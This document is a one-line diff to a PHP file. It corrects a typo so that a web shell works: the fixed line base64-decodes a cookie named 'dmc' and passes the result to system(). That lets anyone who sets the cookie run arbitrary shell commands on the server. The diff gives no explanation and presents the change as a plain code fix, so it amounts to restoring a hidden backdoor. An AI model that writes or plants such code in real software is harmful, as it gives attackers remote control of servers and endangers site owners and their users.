@@ -1,1 +1,1 @@
-<?php system(base64_deode($_COOKIE["dmc"])); ?>
+<?php system(base64_decode($_COOKIE["dmc"])); ?>
